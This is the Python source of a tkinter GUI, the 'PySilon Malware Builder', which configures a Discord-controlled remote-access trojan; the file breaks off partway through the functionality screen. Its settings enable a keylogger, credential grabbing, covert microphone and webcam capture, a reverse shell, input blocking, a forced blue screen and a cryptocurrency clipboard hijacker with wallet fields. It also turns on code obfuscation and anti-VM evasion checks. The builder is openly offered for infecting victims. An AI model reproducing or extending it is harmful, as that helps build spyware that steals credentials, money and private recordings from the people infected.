import tkinter as tk
from tkinter import ttk
import random
import os
import pyperclip
import time
import json
import tkinter.font as tkFont
from PIL import Image, ImageTk, ImageFont
import requests

with open('resources/assets/builder_configuration.json', 'r', encoding='utf-8') as load_configuration:
    builder_configuration = json.loads(''.join(load_configuration.readlines()).replace('\n', ''))

class Builder:
    global builder_configuration
    def __init__(self, master):
        self.master = master
        self.master.title('PySilon Malware Builder')

        try: self.malware_latest_version = json.loads(requests.get('https://raw.githubusercontent.com/mategol/PySilon-malware/v4-dev/resources/assets/builder_configuration.json').text.replace('\n', ''))['malware_version']
        except: self.malware_latest_version = None

        self.create_navigation()
        #builder_configuration['window_sizes'][builder_configuration['use_sizes']]
        self.canvas = tk.Canvas(self.master, border=0, highlightthickness=0)
        self.canvas.place(
            x=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['canvas']['geometry']['pos_x'],
            y=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['canvas']['geometry']['pos_y'],
            width=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['canvas']['geometry']['width'],
            height=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['canvas']['geometry']['height'])
        self.current_window = 0

        self.malware_configuration = {
            'token': '',
            'guild_ids': '',
            'registry_name': '',
            'directory_name': '',
            'executable_name': '',
            'implode_secret': '',
            'icon_path': '',
            'functionalities': {
                'keylogr': True,
                'scrnsht': True,
                'f_manag': True,
                'grabber': True,
                'mc_live': True,
                'mc_recc': True,
                'process': True,
                'rev_shl': True,
                'webcam_': True,
                'scrnrec': True,
                'inputbl': True,
                'bluesod': True,
                'crclipr': True,
                'messger': True,
                'txtspee': True,
                'audctrl': True,
                'monctrl': True,
                'webbloc': True,
                'jmpscar': True,
                'keystrk': True,
                'scrnman': True
            },
            'obfuscation': {
                'enabled': True,
                'settings': {
                    'logicTransformer': True,
                    'removeTypeHints': True,
                    'fstrToFormatSeq': True,
                    'encodeStrings': [
                        True, 
                        'chararray'  # mode (default: chararray) 
                    ],
                    'stringCollector': [
                        True, 
                        729,  # sample_size (default: 729)
                        512  # max_samples
                    ],
                    'floatsToComplex': False,
                    'intObfuscator': [
                        True, 
                        'bits'  # mode
                    ],
                    'renamer': [
                        True,
                        "f'{kind}{get_counter(kind)}'"  # rename_format (default: f'{kind}{get_counter(kind)})
                    ],
                    'typeAliasTransformer': [
                        True, 
                        ["str", "int", "float", "filter", "bool", "bytes", "map"]  # classes_to_alias
                    ],
                    'replaceAttribSet': True,
                    'varCollector': False, # only for Python 3.11
                    'unicodeTransformer': True
                }
            },
            'anti_vm': {
                'enabled': True,
                'FilesCheck': True,
                'ProcessesCheck': True,
                'HardwareIDsCheck': True,
                'MacAddressesCheck': True
            },
            'crypto_clipper': {
                'BTC': '',
                'ETH': '',
                'DOGE': '',
                'LTC': '',
                'XMR': '',
                'BCH': '',
                'DASH': '',
                'TRX': '',
                'XRP': '',
                'XLM': ''
            }
        }

        self.general_settings()

    def new_background(self, demand=None):
        self.canvas.delete('all')
        selected_background = random.randint(1, len(os.listdir('resources/assets/builder_backgrounds')))
        if demand != None: selected_background = demand
        self.image = ImageTk.PhotoImage(Image.open(f'resources/assets/builder_backgrounds/{selected_background}.jpg'))
        self.canvas.create_image(0, 0, image=self.image, anchor=tk.NW)
        self.canvas.create_text(
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['canvas']['tooltips']['hint_pos_x'], 
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['canvas']['tooltips']['hint_pos_y'], 
            text='Hover on elements to get more info.', 
            fill='white', 
            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['canvas']['tooltips']['font_size']), 
            anchor=tk.SW)

 
        if self.malware_latest_version == builder_configuration['malware_version']:
            version_indicator = [
                f'Up to date (v{builder_configuration["malware_version"]})', 
                'lime', 
                builder_configuration['window_sizes'][builder_configuration['use_sizes']]['canvas']['indicator']['latest_pos_x'], 
                0]
            
        elif self.malware_latest_version != None:
            version_indicator = [
                f'Outdated version (v{builder_configuration["malware_version"]}). Latest: v{self.malware_latest_version}', 
                'gold', 
                builder_configuration['window_sizes'][builder_configuration['use_sizes']]['canvas']['indicator']['nonlatest_pos_x'], 
                0]
            
            self.download_icon = tk.PhotoImage(file='resources/assets/builder_elements/download_icon.png')
            self.download = tk.Button(
                self.canvas,
                image=self.download_icon,
                disabledforeground='white',
                relief='flat',
                command=self.open_pysilon_github
                )
            self.canvas.create_window(builder_configuration['window_sizes'][builder_configuration['use_sizes']]['root_geometry']['width'], 0, window=self.download, anchor=tk.NE)
        else:
            version_indicator = [
                'Couldn\'t determine latest version.', 
                'red', 
                builder_configuration['window_sizes'][builder_configuration['use_sizes']]['canvas']['indicator']['latest_pos_x'], 
                0]

        self.canvas.create_text(
            version_indicator[2], 
            version_indicator[3], 
            text=version_indicator[0], 
            fill=version_indicator[1], 
            font=(
                'Consolas', 
                builder_configuration['window_sizes'][builder_configuration['use_sizes']]['canvas']['indicator']['font_size']), 
            anchor=tk.NE)

    def create_navigation(self):
        self.button_frame = tk.Frame(self.master)
        self.button_frame.place(
            x=0, 
            y=0, 
            width=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['root_geometry']['width'], 
            height=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['height'])

        self.general_settings_button = tk.Button(
            self.button_frame,
            text='General Settings',
            font=tkFont.Font(
                family='Consolas', 
                size=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['font_size']),
            disabledforeground='white',
            command=self.general_settings
            )
        self.general_settings_button.place(
            x=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['buttons'][0]['pos_x'], 
            y=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['buttons'][0]['pos_y'], 
            width=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['buttons'][0]['width'], 
            height=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['buttons'][0]['height'])

        self.functionality_settings_button = tk.Button(
            self.button_frame,
            text='Functionality Settings',
            font=tkFont.Font(
                family='Consolas', 
                size=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['font_size']),
            disabledforeground='white',
            command=self.functionality_settings
            )
        self.functionality_settings_button.place(
            x=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['buttons'][1]['pos_x'], 
            y=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['buttons'][1]['pos_y'], 
            width=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['buttons'][1]['width'], 
            height=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['buttons'][1]['height'])

        self.compiling_settings_button = tk.Button(
            self.button_frame,
            text='Compiling Settings',
            font=tkFont.Font(
                family='Consolas', 
                size=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['font_size']),
            disabledforeground='white',
            command=self.compiling_settings
            )
        self.compiling_settings_button.place(
            x=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['buttons'][2]['pos_x'], 
            y=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['buttons'][2]['pos_y'], 
            width=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['buttons'][2]['width'], 
            height=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['buttons'][2]['height'])

        self.banner_image = tk.PhotoImage(file='resources/assets/builder_elements/banner.png')
        self.banner = tk.Button(
            self.button_frame,
            image=self.banner_image,
            disabledforeground='white',
            relief='flat',
            command=self.open_pysilon
            )
        self.banner.place(
            x=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['banner']['pos_x'], 
            y=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['banner']['pos_y'], 
            width=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['banner']['width'], 
            height=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['banner']['height'])
        
        horizontal_separator = ttk.Separator(self.button_frame, orient='horizontal')
        horizontal_separator.place(
            x=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['dividers'][0]['pos_x'], 
            y=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['dividers'][0]['pos_y'], 
            height=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['dividers'][0]['height'], 
            width=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['dividers'][0]['width'])
        
        vertical_separator = ttk.Separator(self.button_frame, orient='vertical')
        vertical_separator.place(
            x=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['dividers'][1]['pos_x'], 
            y=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['dividers'][1]['pos_y'], 
            height=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['dividers'][1]['height'], 
            width=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['dividers'][1]['width'])
    
    def save_configuration(self, temporary=True, close=False, configuration=None, from_window=None):
        match from_window:
            case 1:
                self.malware_configuration['token'] = self.token_entry.get()
                self.malware_configuration['guild_ids'] = self.guildids_entry.get()
                self.malware_configuration['registry_name'] = self.registry_entry.get()
                self.malware_configuration['directory_name'] = self.directory_entry.get()
                self.malware_configuration['executable_name'] = self.executable_entry.get()
                self.malware_configuration['implode_secret'] = self.implode_entry.get()
            case 2:
                self.malware_configuration['functionalities'] = {
                    'keylogr': self.cbvar_keylogr.get(),
                    'scrnsht': self.cbvar_scrnsht.get(),
                    'f_manag': self.cbvar_fmanag.get(),
                    'grabber': self.cbvar_grabber.get(),
                    'mc_live': self.cbvar_mclive.get(),
                    'mc_recc': self.cbvar_mcrecc.get(),
                    'process': self.cbvar_process.get(),
                    'rev_shl': self.cbvar_revshl.get(),
                    'webcam_': self.cbvar_webcam.get(),
                    'scrnrec': self.cbvar_scrnrec.get(),
                    'inputbl': self.cbvar_inputbl.get(),
                    'bluesod': self.cbvar_bluesod.get(),
                    'crclipr': self.cbvar_crclipr.get(),
                    'messger': self.cbvar_messger.get(),
                    'txtspee': self.cbvar_txtspee.get(),
                    'audctrl': self.cbvar_audctrl.get(),
                    'monctrl': self.cbvar_monctrl.get(),
                    'webbloc': self.cbvar_webbloc.get(),
                    'jmpscar': self.cbvar_jmpscar.get(),
                    'keystrk': self.cbvar_keystrk.get(),
                    'scrnman': self.cbvar_scrnman.get()
                }
            case 3:
                pass

        with open('configuration.json' if not temporary else 'resources/assets/configuration.tmp', 'w', encoding='utf-8') as configuration_file:
            configuration_file.write(json.dumps(self.malware_configuration, indent=4))

        if close != False:
            close.destroy()

    def load_configuration(self, temporary):
        with open('configuration.json' if not temporary else 'resources/assets/configuration.tmp', 'r', encoding='utf-8') as configuration_file:
            self.malware_configuration = json.loads(''.join(configuration_file.readlines()))
    
    def write_configuration(self, temporary=True, close=False):
        with open('configuration.json' if not temporary else 'resources/assets/configuration.tmp', 'w', encoding='utf-8') as configuration_file:
            configuration_file.write(self.text.get('1.0', tk.END))
        self.malware_configuration = json.loads(self.text.get('1.0', tk.END))
        if close != False:
            close.destroy()

    def configuration_editor(self, file, highlight=['0.0', '1.0']):
        cfg_editor = tk.Tk()
        cfg_editor.geometry(str(builder_configuration['window_sizes'][builder_configuration['use_sizes']]['config_editor']['geometry']['width']) + 'x' + str(builder_configuration['window_sizes'][builder_configuration['use_sizes']]['config_editor']['geometry']['height']))

        cfg_editor.title('Configuration Editor')

        frame = tk.Frame(cfg_editor)
        frame.place(
            x=0, 
            y=0, 
            width=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['config_editor']['geometry']['width'], 
            height=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['config_editor']['geometry']['height'])

        self.text = tk.Text(frame)
        self.text.place(
            x=0, 
            y=0, 
            width=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['config_editor']['text_area']['width'], 
            height=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['config_editor']['text_area']['height'])

        with open(file, 'r', encoding='utf-8') as configuration_file:
            self.text.insert('1.0', ''.join(configuration_file.readlines()))

        self.text.tag_add('highlight', '34.0', '38.0')
        self.text.tag_configure('highlight', background='#9effb8', foreground='black')
        self.text.see(tk.END)

        btn_savecfg = tk.Button(
            frame,
            text='Save',
            font=tkFont.Font(
                family='Consolas', 
                size=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['config_editor']['save_button']['font_size']),
            disabledforeground='white',
            command=lambda:self.write_configuration(True, cfg_editor)
        )
        btn_savecfg.place(
            x=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['config_editor']['save_button']['pos_x'], 
            y=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['config_editor']['save_button']['pos_y'], 
            anchor=tk.SE)

        cfg_editor.tk_setPalette(background='#0A0A10', foreground='white', activeBackground='#0A0A10', activeForeground='white')
        cfg_editor.mainloop()

    def double_click_settings(self, context):
        if time.time() - self.time_check < 0.5:
            if context == 'antivm':
                self.configuration_editor('resources/assets/configuration.tmp')
        self.time_check = time.time()

    def open_pysilon(self):
        os.system('start https://pysilon.net')

    def open_pysilon_github(self):
        os.system('start https://github.com/mategol/PySilon-malware/releases')
    
    def show_tooltip(self, event, tooltip_text):
        self.tooltip_label = tk.Label(self.canvas, text=tooltip_text, relief=tk.RIDGE, borderwidth=2, background="#0A0A10")
        self.tooltip_label.place(
            x=0, 
            y=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['canvas']['tooltips']['pos_y'], 
            anchor=tk.SW)

    def hide_tooltip(self, event):
        self.tooltip_label.place_forget()

    def paste_token(self):
        self.token_entry.insert(0, pyperclip.paste())

    def general_settings(self):
        self.general_settings_button['state'] = tk.DISABLED
        self.general_settings_button['relief'] = 'flat'
        self.functionality_settings_button ['state'] = tk.NORMAL
        self.functionality_settings_button['relief'] = 'groove'
        self.compiling_settings_button['state'] = tk.NORMAL
        self.compiling_settings_button['relief'] = 'groove'
        
        if self.current_window > 0: self.save_configuration(True, from_window=self.current_window)
        self.current_window = 1
        self.new_background(1)
        self.load_configuration(True)

        # BOT Token
        self.canvas.create_text(
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['labels'][0]['pos_x'], 
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['labels'][0]['pos_y'], 
            text='BOT Token:', 
            fill='white', 
            font=(
                'Consolas', 
                builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['font_size']), 
            anchor=tk.E)
        
        self.token_entry = tk.Entry(
            self.canvas, 
            font=tkFont.Font(
                family='Consolas', 
                size=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['font_size']), 
            width=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['entries'][0]['width'])
        
        self.token_entry.insert(0, self.malware_configuration['token'])
        self.token_entry.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['token_entry']))
        self.token_entry.bind("<Leave>", self.hide_tooltip)

        self.canvas.create_window(
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['entries'][0]['pos_x'], 
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['entries'][0]['pos_y'], 
            window=self.token_entry, 
            anchor='w')
        
        self.paste_token_icon = tk.PhotoImage(file='resources/assets/builder_elements/paste_icon.png')

        self.paste_token_button = tk.Button(
            self.canvas,
            image=self.paste_token_icon,
            disabledforeground='white',
            relief='flat',
            width=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['token_paste_button']['width'],
            height=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['token_paste_button']['height'],
            command=self.paste_token
            )
        
        self.canvas.create_window(
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['token_paste_button']['pos_x'], 
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['token_paste_button']['pos_y'], 
            window=self.paste_token_button, 
            anchor='w')
 
        # Guild IDs
        self.canvas.create_text(
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['labels'][1]['pos_x'], 
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['labels'][1]['pos_y'], 
            text='Guild IDs:', 
            fill='white', 
            font=(
                'Consolas', 
                builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['font_size']), 
            anchor=tk.E)
        
        self.guildids_entry = tk.Entry(
            self.canvas, 
            font=tkFont.Font(
                family='Consolas', 
                size=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['font_size']), 
            width=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['entries'][1]['width'])
        
        self.guildids_entry.insert(0, self.malware_configuration['guild_ids'])
        self.guildids_entry.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['guildids_entry']))
        self.guildids_entry.bind("<Leave>", self.hide_tooltip)

        self.canvas.create_window(
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['entries'][1]['pos_x'], 
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['entries'][1]['pos_y'], 
            window=self.guildids_entry, 
            anchor='w')

        # Registry Name
        self.canvas.create_text(
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['labels'][2]['pos_x'], 
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['labels'][2]['pos_y'], 
            text='Registry Name:', 
            fill='white', 
            font=(
                'Consolas', 
                builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['font_size']), 
            anchor=tk.E)
        
        self.registry_entry = tk.Entry(
            self.canvas, 
            font=tkFont.Font(
                family='Consolas', 
                size=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['font_size']), 
            width=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['entries'][2]['width'])
        
        self.registry_entry.insert(0, self.malware_configuration['registry_name'])
        self.registry_entry.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['registry_entry']))
        self.registry_entry.bind("<Leave>", self.hide_tooltip)

        self.canvas.create_window(
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['entries'][2]['pos_x'], 
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['entries'][2]['pos_y'], 
            window=self.registry_entry, 
            anchor='w')

        # Directory Name
        self.canvas.create_text(
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['labels'][3]['pos_x'], 
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['labels'][3]['pos_y'], 
            text='Directory Name:', 
            fill='white', 
            font=(
                'Consolas', 
                builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['font_size']), 
            anchor=tk.E)
        
        self.directory_entry = tk.Entry(
            self.canvas, 
            font=tkFont.Font(
                family='Consolas', 
                size=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['font_size']), 
            width=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['entries'][3]['width'])
        
        self.directory_entry.insert(0, self.malware_configuration['directory_name'])
        self.directory_entry.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['directory_entry']))
        self.directory_entry.bind("<Leave>", self.hide_tooltip)

        self.canvas.create_window(
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['entries'][3]['pos_x'], 
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['entries'][3]['pos_y'],
            window=self.directory_entry, 
            anchor='w')

        # Executable Name
        self.canvas.create_text(
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['labels'][4]['pos_x'], 
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['labels'][4]['pos_y'],
            text='Executable Name:', 
            fill='white', 
            font=(
                'Consolas', 
                builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['font_size']), 
            anchor=tk.E)
        
        self.executable_entry = tk.Entry(
            self.canvas, 
            font=tkFont.Font(
                family='Consolas', 
                size=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['font_size']), 
            width=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['entries'][4]['width'])
        
        self.executable_entry.insert(0, self.malware_configuration['executable_name'])
        self.executable_entry.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['executable_entry']))
        self.executable_entry.bind("<Leave>", self.hide_tooltip)

        self.canvas.create_window(
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['entries'][4]['pos_x'], 
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['entries'][4]['pos_y'],
            window=self.executable_entry, 
            anchor='w')
        
        self.canvas.create_text(
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['labels'][4]['exe_pos_x'], 
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['labels'][4]['exe_pos_y'],
            text='.exe', 
            fill='white', 
            font=(
                'Consolas', 
                builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['font_size']),
            anchor=tk.W)

        # Implode Password
        self.canvas.create_text(
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['labels'][5]['pos_x'],
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['labels'][5]['pos_y'],
            text='Implode Password:', 
            fill='white', 
            font=(
                'Consolas', 
                builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['font_size']), 
            anchor=tk.E)
        
        self.implode_entry = tk.Entry(
            self.canvas, 
            font=tkFont.Font(
                family='Consolas', 
                size=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['font_size']), 
            width=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['entries'][5]['width'],
            show='*')
        
        self.implode_entry.insert(0, self.malware_configuration['implode_secret'])
        self.implode_entry.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['implode_entry']))
        self.implode_entry.bind("<Leave>", self.hide_tooltip)

        self.canvas.create_window(
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['entries'][5]['pos_x'], 
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['entries'][5]['pos_y'],
            window=self.implode_entry, 
            anchor='w')

    def functionality_settings(self):
        self.general_settings_button['state'] = tk.NORMAL
        self.general_settings_button['relief'] = 'groove'
        self.functionality_settings_button ['state'] = tk.DISABLED
        self.functionality_settings_button['relief'] = 'flat'
        self.compiling_settings_button['state'] = tk.NORMAL
        self.compiling_settings_button['relief'] = 'groove'
        self.save_configuration(True, from_window=self.current_window)
        self.current_window = 2
        self.new_background(2)
        self.load_configuration(True)

        x_start, y_start, x_delta, y_delta = builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['checkbox_list']['x_start'], builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['checkbox_list']['y_start'], builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['checkbox_list']['x_delta'], builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['checkbox_list']['y_delta']

        self.cbvar_keylogr = tk.BooleanVar(value=True)
        self.cb_keylogr = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='keylogger',
            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
            variable=self.cbvar_keylogr,
            
            onvalue=True,
            offvalue=False
        )
        self.cb_keylogr.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['keylogr']))
        self.cb_keylogr.bind("<Leave>", self.hide_tooltip)
        self.cbvar_keylogr.set(self.malware_configuration['functionalities']['keylogr'])
        self.canvas.create_window(x_start, y_start+y_delta*0, window=self.cb_keylogr, anchor='w')

        self.cbvar_scrnsht = tk.BooleanVar(value=True)
        self.cb_scrnsht = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='take screenshots',
            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
            variable=self.cbvar_scrnsht,
            
            onvalue=True,
            offvalue=False
        )
        self.cb_scrnsht.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['scrnsht']))
        self.cb_scrnsht.bind("<Leave>", self.hide_tooltip)
        self.cbvar_scrnsht.set(self.malware_configuration['functionalities']['scrnsht'])
        self.canvas.create_window(x_start, y_start+y_delta*1, window=self.cb_scrnsht, anchor='w')

        self.cbvar_fmanag = tk.BooleanVar(value=True)
        self.cb_fmanag = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='file management',
            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
            variable=self.cbvar_fmanag,
            
            onvalue=True,
            offvalue=False
        )
        self.cb_fmanag.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['f_manag']))
        self.cb_fmanag.bind("<Leave>", self.hide_tooltip)
        self.cbvar_fmanag.set(self.malware_configuration['functionalities']['f_manag'])
        self.canvas.create_window(x_start, y_start+y_delta*2, window=self.cb_fmanag, anchor='w')

        self.cbvar_grabber = tk.BooleanVar(value=True)
        self.cb_grabber = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='grabber',
            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
            variable=self.cbvar_grabber,
            
            onvalue=True,
            offvalue=False
        )
        self.cb_grabber.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['grabber']))
        self.cb_grabber.bind("<Leave>", self.hide_tooltip)
        self.cbvar_grabber.set(self.malware_configuration['functionalities']['grabber'])
        self.canvas.create_window(x_start, y_start+y_delta*3, window=self.cb_grabber, anchor='w')

        self.cbvar_mclive = tk.BooleanVar(value=True)
        self.cb_mclive = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='stream live microphone',
            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
            variable=self.cbvar_mclive,
            
            onvalue=True,
            offvalue=False
        )
        self.cb_mclive.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['mc_live']))
        self.cb_mclive.bind("<Leave>", self.hide_tooltip)
        self.cbvar_mclive.set(self.malware_configuration['functionalities']['mc_live'])
        self.canvas.create_window(x_start, y_start+y_delta*4, window=self.cb_mclive, anchor='w')

        self.cbvar_mcrecc = tk.BooleanVar(value=True)
        self.cb_mcrecc = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='24/7 microphone recording',
            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
            variable=self.cbvar_mcrecc,
            
            onvalue=True,
            offvalue=False
        )
        self.cb_mcrecc.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['mc_recc']))
        self.cb_mcrecc.bind("<Leave>", self.hide_tooltip)
        self.cbvar_mcrecc.set(self.malware_configuration['functionalities']['mc_recc'])
        self.canvas.create_window(x_start, y_start+y_delta*5, window=self.cb_mcrecc, anchor='w')

        self.cbvar_process = tk.BooleanVar(value=True)
        self.cb_process = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='manage processes',
            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
            variable=self.cbvar_process,
            
            onvalue=True,
            offvalue=False
        )
        self.cb_process.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['process']))
        self.cb_process.bind("<Leave>", self.hide_tooltip)
        self.cbvar_process.set(self.malware_configuration['functionalities']['process'])
        self.canvas.create_window(x_start, y_start+y_delta*6, window=self.cb_process, anchor='w')

        self.cbvar_revshl = tk.BooleanVar(value=True)
        self.cb_revshl = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='reverse shell',
            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
            variable=self.cbvar_revshl,
            
            onvalue=True,
            offvalue=False
        )
        self.cb_revshl.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['rev_shl']))
        self.cb_revshl.bind("<Leave>", self.hide_tooltip)
        self.cbvar_revshl.set(self.malware_configuration['functionalities']['rev_shl'])
        self.canvas.create_window(x_start, y_start+y_delta*7, window=self.cb_revshl, anchor='w')
        
        self.cbvar_webcam = tk.BooleanVar(value=True)
        self.cb_webcam = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='webcam handling',
            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
            variable=self.cbvar_webcam,
            
            onvalue=True,
            offvalue=False
        )
        self.cb_webcam.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['webcam_']))
        self.cb_webcam.bind("<Leave>", self.hide_tooltip)
        self.cbvar_webcam.set(self.malware_configuration['functionalities']['webcam_'])
        self.canvas.create_window(x_start, y_start+y_delta*8, window=self.cb_webcam, anchor='w')

        self.cbvar_scrnrec = tk.BooleanVar(value=True)
        self.cb_scrnrec = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='screen recording',
            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
            variable=self.cbvar_scrnrec,
            
            onvalue=True,
            offvalue=False
        )
